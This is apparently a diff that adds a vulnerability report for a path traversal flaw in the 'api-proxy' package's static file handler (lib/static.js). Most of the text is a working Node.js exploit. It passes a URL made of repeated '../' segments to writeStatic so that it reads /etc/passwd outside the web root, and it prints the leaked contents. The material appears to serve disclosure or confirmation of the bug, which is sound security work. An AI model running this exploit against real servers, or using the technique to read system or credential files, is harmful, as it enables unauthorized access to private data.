@@ -1,0 +1,27 @@
+Confirmed a path traversal vulnerability in `api-proxy`'s static file handler (`lib/static.js`), which joins the untrusted `request.url` directly into a filesystem path without sanitizing `../` sequences, allowing arbitrary file reads outside the intended `www` root (e.g., `/etc/passwd`).
+
+```javascript
+// Exploit for Path Traversal in api-proxy's static file server (lib/static.js)
+// The writeStatic() function builds filepath = Path.join(root, request.url)
+// without stripping ".." sequences, allowing reads outside the "www" root.
+
+var writeStatic = require("./node_modules/api-proxy/lib/static.js").writeStatic;
+
+// Enough "../" segments to climb from node_modules/api-proxy/www up to filesystem root,
+// then descend into /etc/passwd (a file well outside the intended static root).
+var traversal = Array(12).fill("..").join("/");
+var request = { url: "/" + traversal + "/etc/passwd" };
+
+var response = {
+  writeHead: function () {},
+  write: function (data) {
+    console.log("=== Leaked file content outside static root ===");
+    console.log(data.toString());
+  },
+  end: function () {}
+};
+
+writeStatic(request, response, function () {
+  console.log("not found (adjust the number of '../' for your directory depth)");
+});
+```
